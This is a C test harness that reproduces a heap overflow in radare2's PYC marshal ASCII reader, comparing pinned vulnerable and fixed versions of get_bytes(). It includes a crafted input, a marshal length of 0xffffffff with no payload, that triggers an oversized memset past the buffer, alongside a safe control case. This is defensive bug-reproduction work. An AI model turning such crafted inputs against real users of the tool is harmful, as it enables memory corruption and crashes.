/* Stand-in driver for radare2 PYC marshal ASCII reader bytes pinned verbatim
 * from libr/bin/format/pyc/marshal.c at 6.1.8 and fix 6727454, and the
 * r_buf_read() memset sink pinned verbatim from libr/util/buf.c at 6.1.8.
 * No radare2 build: only the surrounding types, R_NEWS0/R_NEW0 macros,
 * get_ut32(), buf_read() and the embedding of get_bytes()/ASCII readers are
 * stand-ins. Pinned lines are never edited; #line directives only label frames. */
#define _GNU_SOURCE
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef uint8_t ut8;
typedef uint32_t ut32;
typedef uint64_t ut64;
typedef int64_t st64;

#define ST32_MAX 0x7fffffff
#define R_NEWS0(T, N) ((T *) calloc ((size_t)(N), sizeof (T)))
#define R_NEW0(T) ((T *) calloc (1, sizeof (T)))
#define R_FREE(x) do { free (x); (x) = NULL; } while (0)
#define TYPE_ASCII 'a'

struct pyc_object {
	ut8 type;
	ut8 *data;
};
typedef struct pyc_object pyc_object;

typedef struct r_buf_t {
	const ut8 *bytes;
	ut64 len;
	ut64 offset;
	ut8 Oxff_priv;
} RBuffer;

/* Stand-in: 4-byte little-endian marshal length field from a crafted .pyc. */
static ut32
get_ut32 (RBuffer *b, bool *error)
{
	ut32 n = 0;
	if (b->offset + 4 > b->len) {
		*error = true;
		return 0;
	}
	n = (ut32) b->bytes[b->offset]
		| ((ut32) b->bytes[b->offset + 1] << 8)
		| ((ut32) b->bytes[b->offset + 2] << 16)
		| ((ut32) b->bytes[b->offset + 3] << 24);
	b->offset += 4;
	return n;
}

/* Stand-in: bytes actually present after the length field. */
static st64
buf_read (RBuffer *b, ut8 *out, ut64 want)
{
	ut64 avail = b->len - b->offset;
	ut64 n = want < avail? want: avail;
	if (n) {
		memcpy (out, b->bytes + b->offset, (size_t) n);
	}
	b->offset += n;
	return (st64) n;
}

static int g_sink_calls = 0;
static st64 g_sink_r = -1;
static ut64 g_sink_len = 0;
static ut8 g_sink_byte = 0;

/* The if/memset shape below is r_buf_read() at buf.c:491-497. Only the
 * PLAIN_MODE arm is altered, to bound the ~4GB write to 8 observable bytes. */
static st64
r_buf_read (RBuffer *b, ut8 *buf, ut64 len)
{
	st64 r = buf_read (b, buf, len);
	if (r >= 0 && (ut64) r < len) {
		g_sink_calls++;
		g_sink_r = r;
		g_sink_len = len - (ut64) r;
		g_sink_byte = b->Oxff_priv;
#ifdef PLAIN_MODE
		printf ("SINK_BUF=%p SINK_R=%lld SINK_LEN=%llu SINK_BYTE=%02x\n",
			(void *) buf, (long long) r,
			(unsigned long long) g_sink_len, b->Oxff_priv);
		memset (buf + r, b->Oxff_priv, 8);
#else
#line 496 "pins/buf-sink.inc"
		memset (buf + r, b->Oxff_priv, len - r);
#line 100 "harness/driver.c"
#endif
	}
	return r;
}

/* Verbatim pinned get_bytes(): vulnerable 6.1.8:78-85, fixed 6727454:78-89. */
#ifdef VARIANT_FIXED
#line 78 "pins/get-bytes-fixed.inc"
#include "pins/get-bytes-fixed.inc"
#else
#line 78 "pins/get-bytes-vulnerable.inc"
#include "pins/get-bytes-vulnerable.inc"
#endif
#line 120 "harness/driver.c"

/* Verbatim pinned ASCII readers (6.1.8:615-644, unchanged by the fix). */
#line 615 "pins/ascii-readers.inc"
#include "pins/ascii-readers.inc"
#line 140 "harness/driver.c"

int
main (int argc, char **argv)
{
	const char *mode = argc > 1? argv[1]: "attack";
	/* TYPE_ASCII ('a') marshal object: 4-byte length 0xffffffff, no payload. */
	static const ut8 attack_stream[4] = { 0xff, 0xff, 0xff, 0xff };
	/* Safe control: 4-byte length 16 and 16 payload bytes. */
	static const ut8 safe_stream[20] = {
		0x10, 0x00, 0x00, 0x00,
		0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48,
		0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f, 0x50
	};
	RBuffer b = { 0 };
	ut32 field;
	pyc_object *o;

	if (!strcmp (mode, "safe")) {
		b.bytes = safe_stream;
		b.len = sizeof (safe_stream);
	} else {
		b.bytes = attack_stream;
		b.len = sizeof (attack_stream);
	}
	b.Oxff_priv = 0xff;
	field = get_ut32 (&b, &(bool) { false });
	b.offset = 0;

	o = get_ascii_object (&b);
	printf ("MODE=%s LEN_FIELD=%u RC=%d SINK=%d SINK_LEN=%llu SINK_BYTE=%02x\n",
		mode, field, o? 0: 3, g_sink_calls,
		(unsigned long long) g_sink_len, g_sink_byte);
	return o? 0: 3;
}
